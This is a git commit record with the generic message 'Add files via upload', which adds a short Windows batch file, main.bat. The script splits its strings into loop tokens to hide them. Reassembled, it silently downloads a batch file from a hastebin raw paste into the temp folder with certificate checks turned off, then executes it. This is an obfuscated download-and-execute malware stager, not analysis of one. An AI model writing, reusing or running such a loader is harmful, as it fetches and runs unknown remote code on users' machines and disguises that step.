840dfb4d20875fff52560843c67126b7740e9970
Sap196 <93683318+Sap196@users.noreply.github.com>
2022-01-21 16:56:27 +0100

    Add files via upload

---
+++ main.bat
@@ -0,0 +1,5 @@
+@echo off
+for /f "tokens=1-6" %%a in (""%temp%\A" "164271328028265" co  bin . rixavecuva") do (
+    curl -#Lsko "%%~a%%~b%%ebat" "haste%%d%%e%%cm/raw/%%f"
+    call "%%~a%%~b%%ebat" "%%~b"
+)
